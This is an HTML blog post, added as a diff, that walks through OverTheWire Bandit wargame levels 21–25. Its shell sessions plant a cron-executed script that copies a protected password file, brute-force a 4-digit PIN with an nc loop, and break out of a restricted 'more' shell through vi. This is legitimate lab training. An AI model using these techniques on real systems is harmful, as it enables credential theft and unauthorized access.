@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="/css/custom.css"><!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>OverTheWire Bandit Levels 21-25 | Scott Taylor</title>
+<meta name="generator" content="Jekyll v4.1.1" />
+<meta property="og:title" content="OverTheWire Bandit Levels 21-25" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Level 21 A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed. bandit21@bandit:~$ cat /etc/cron.d/cronjob_bandit22 @reboot bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null * * * * * bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null bandit21@bandit:~$ cat /usr/bin/cronjob_bandit22.sh #!/bin/bash chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv cat /etc/bandit_pass/bandit22 &gt; /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv bandit21@bandit:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv bandit21@bandit:~$ ssh bandit22@localhost bandit22@localhost&#39;s password:" />
+<meta property="og:description" content="Level 21 A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed. bandit21@bandit:~$ cat /etc/cron.d/cronjob_bandit22 @reboot bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null * * * * * bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null bandit21@bandit:~$ cat /usr/bin/cronjob_bandit22.sh #!/bin/bash chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv cat /etc/bandit_pass/bandit22 &gt; /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv bandit21@bandit:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv bandit21@bandit:~$ ssh bandit22@localhost bandit22@localhost&#39;s password:" />
+<link rel="canonical" href="https://scottctaylor12.github.io/otw-bandit21-25.html" />
+<meta property="og:url" content="https://scottctaylor12.github.io/otw-bandit21-25.html" />
+<meta property="og:site_name" content="Scott Taylor" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2018-09-15T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="OverTheWire Bandit Levels 21-25" />
+<script type="application/ld+json">
+{"description":"Level 21 A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed. bandit21@bandit:~$ cat /etc/cron.d/cronjob_bandit22 @reboot bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null * * * * * bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null bandit21@bandit:~$ cat /usr/bin/cronjob_bandit22.sh #!/bin/bash chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv cat /etc/bandit_pass/bandit22 &gt; /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv bandit21@bandit:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv bandit21@bandit:~$ ssh bandit22@localhost bandit22@localhost&#39;s password:","headline":"OverTheWire Bandit Levels 21-25","dateModified":"2018-09-15T00:00:00+00:00","datePublished":"2018-09-15T00:00:00+00:00","url":"https://scottctaylor12.github.io/otw-bandit21-25.html","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://scottctaylor12.github.io/otw-bandit21-25.html"},"@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="https://scottctaylor12.github.io/feed.xml" title="Scott Taylor" /></head>
+
+  <body>
+
+    <header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">Scott Taylor</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/posts/">Posts</a></div>
+      </nav></div>
+</header>
+
+
+    <main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">OverTheWire Bandit Levels 21-25</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2018-09-15T00:00:00+00:00" itemprop="datePublished">
+        
+        Sep 15, 2018
+      </time>
+      </p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <h2 id="level-21">Level 21</h2>
+<p>A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bandit21@bandit:~$ cat /etc/cron.d/cronjob_bandit22
+@reboot bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null
+* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null
+bandit21@bandit:~$ cat /usr/bin/cronjob_bandit22.sh
+#!/bin/bash
+chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+cat /etc/bandit_pass/bandit22 &gt; /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+bandit21@bandit:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+bandit21@bandit:~$ ssh bandit22@localhost
+bandit22@localhost's password:
+</code></pre></div></div>
+
+<h2 id="level-22">Level 22</h2>
+<p>A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.</p>
+
+<p><strong>NOTE: Looking at shell scripts written by other people is a very useful skill. The script for this level is intentionally made easy to read. If you are having problems understanding what it does, try executing it to see the debug information it prints.</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bandit22@bandit:~$ cat /etc/cron.d/cronjob_bandit23
+@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &amp;&gt; /dev/null
+* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &amp;&gt; /dev/null
+bandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh
+#!/bin/bash
+
+myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+cat /etc/bandit_pass/$myname &gt; /tmp/$mytarget
+bandit22@bandit:~$ cat /tmp/$(echo I am user bandit23 | md5sum | cut -d ' ' -f 1)
+&lt;PASSWORD&gt;
+bandit22@bandit:~$ ssh bandit23@localhost
+bandit23@localhost's password:
+</code></pre></div></div>
+
+<h2 id="level-23">Level 23</h2>
+<p>A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.</p>
+
+<p><strong>NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!</strong></p>
+
+<p><strong>NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &amp;&gt; /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &amp;&gt; /dev/null
+bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        timeout -s 9 60 ./$i
+        rm -f ./$i
+    fi
+done
+bandit23@bandit:~$ cd /tmp/scottctaylor12
+bandit23@bandit:/tmp/scottctaylor12$ touch bandit24-pass.sh
+bandit23@bandit:/tmp/scottctaylor12$ chmod 777 bandit24-pass.sh
+(WRITE SCRIPT)
+
+bandit23@bandit:/tmp/scottctaylor12$ cat bandit24-pass.sh
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 &gt; /tmp/scottctaylor12/PASSWORD
+chmod 666 /tmp/scottctaylor12/PASSWORD
+bandit23@bandit:/tmp/scottctaylor12$ cp bandit24-pass.sh /var/spool/bandit24/
+bandit23@bandit:/tmp/scottctaylor12$ cat PASSWORD
+&lt;PASSWORD&gt;
+bandit23@bandit:/tmp/scottctaylor12$ ssh bandit24@localhost
+bandit24@localhost's password:
+</code></pre></div></div>
+<h2 id="level-24">Level 24</h2>
+<p>A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bandit24@bandit:~$ cd /tmp/scottctaylor12
+bandit24@bandit:/tmp/scottctaylor12$ touch brute-force-25.sh
+bandit24@bandit:/tmp/scottctaylor12$ chmod 777 brute-force-25.sh
+(EDIT brute-force-25.sh)
+bandit24@bandit:/tmp/scottctaylor12$ cat brute-force-25.sh
+#!/bin/bash
+PASS=$(cat /etc/bandit_pass/bandit24)
+
+for i in {0000..9999}
+do
+    echo $i
+    echo $PASS $i | nc localhost 30002
+done
+
+bandit24@bandit:/tmp/scottctaylor12$ ./brute-force-25.sh &gt;&gt; output
+(AN HOUR LATER.....)
+bandit24@bandit:/tmp/scottctaylor12$ cat output | grep -i -A2 -B2 ^correct
+5440
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+Correct!
+The password of user bandit25 is &lt;PASSWORD&gt;
+bandit24@bandit:/tmp/scottctaylor12$ ssh bandit25@localhost
+bandit24@localhost's password:
+</code></pre></div></div>
+
+<h2 id="level-25">Level 25</h2>
+<p>Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bandit25@bandit:~$ ls
+bandit26.sshkey
+bandit25@bandit:~$ ssh -i bandit26.sshkey bandit26@localhost
+..
+Connection to localhost closed
+bandit25@bandit:~$ cat /etc/passwd | grep bandit26
+bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
+bandit25@bandit:~$ cat /usr/bin/showtext
+#!/bin/sh
+
+export TERM=linux
+
+more ~/text.txt
+exit 0
+(SHRINK WINDOW TO SHOW 3 LINES)
+bandit25@bandit:~$ ssh -i bandit26.sshkey bandit26@localhost
+v
+:set shell=/bin/bash
+:shell
+bandit26@bandit:~$
+</code></pre></div></div>
+
+<p>Continue to OverTheWire Bandit <a href="https://scottctaylor12.github.io/otw-bandit26-30.html">Levels 26-30</a></p>
+
+  </div>
+
+  
+
+  <a class="u-url" href="/otw-bandit21-25.html" hidden></a>
+</article>
+
+      </div>
+    </main>
+
+    <footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Scott Taylor</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">Scott Taylor</li><li><a class="u-email" href="mailto:scott.c.taylor12@gmail.com">scott.c.taylor12@gmail.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/scottctaylor12"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">scottctaylor12</span></a></li><li><a href="https://www.linkedin.com/in/scottctaylor12"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#linkedin"></use></svg> <span class="username">scottctaylor12</span></a></li><li><a href="https://www.twitter.com/scottctaylor12"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">scottctaylor12</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>OSCP | RHCE | Splunk</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+
+
+  </body>
+
+</html>
